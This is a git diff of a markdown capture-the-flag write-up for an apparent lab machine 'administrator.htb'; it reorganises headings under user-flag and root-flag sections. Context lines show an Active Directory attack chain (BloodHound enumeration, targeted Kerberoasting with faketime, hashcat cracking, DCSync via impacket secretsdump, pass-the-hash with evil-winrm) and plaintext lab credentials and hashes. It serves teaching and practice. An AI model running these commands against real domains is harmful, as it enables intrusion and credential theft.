@@ -32,7 +32,8 @@ By using evil-winrm we get a Powershell
 `net user` → it will enumerate all users
 `whoami /all` → it will provide user info , group info, user priv info and user claims unknown
 
-# Bloodhound
+# User Flag
+## Bloodhound
 
 click on user oliva (you can see that by clicking on analysis and use queries)
 
@@ -68,7 +69,8 @@ emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
 ethan:limpbizkit
 ```
 
-# kerberoasting
+# Root Flag
+## kerberoasting
 
 we checked **emily** user's FDOC and it directs to **ethan** which is vulnerable to **GenericWrite** 
 
@@ -85,7 +87,7 @@ python3 targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFV
    ⇒ if we check nmap script result there is clock-skew {"output"⇒ “7h00m00s”}
                   → which is 7 hours different from our time, so we need to add 7 hours to our time using 
 
-### faketime
+## faketime
 ```
 faketime 'now +7 hours' python3 targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
 ```
@@ -93,7 +95,7 @@ we got the hash and we cracked it using **hashcat**
 
 `ethan: limpbizkit` 
 
-# impackets
+## impackets
 we seen that ethan FDOC is DCSync (even it has more we choose DCsync) then we used secretsdump.py from /impacket/example
 
 ```
@@ -112,6 +114,6 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
 ```
 
 
-we logged in with the **hash** using `evil-winrm` 
+we logged in with the `hash` using `evil-winrm` 
 
-Gained Root 
+Gained `Root` 
